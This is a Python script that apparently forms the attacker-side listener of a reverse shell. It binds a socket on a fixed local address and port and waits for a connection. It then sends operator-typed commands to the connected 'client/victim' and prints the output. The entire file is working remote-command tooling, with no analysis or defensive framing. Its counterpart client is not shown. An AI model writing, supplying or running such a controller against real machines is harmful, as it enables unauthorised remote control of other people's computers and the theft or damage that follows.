import socket
import sys


def create_socket():
    try:
        global host
        global port
        global s
        host = "192.168.0.13"
        port = 9999
        s = socket.socket()
    
    except socket.error as msg:
        print("Socket connection error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Establish a connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()                              #conn is connection object, address is a list storing IP add and port
    print('Connection has been established. |' + "IP: " + address[0] + "Port: " + str(address[1]))    # prints client's ip/port info
    send_command(conn)
    conn.close()

# Send commands to client/victim/friend
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()                                     #close cmd prompt
        if len(str.encode(cmd)) > 0:                       # know user has typed something in
            conn.send(str.encode(cmd))                     # send command from our computer to other
            client_response = str(conn.recv(1024),'utf-8')      # have to convert incoming data from byte to string format
            print(client_response, end="")                  #end=""  after printing out makes it go to next line

def main():
    create_socket()
    bind_socket()
    socket_accept()


main()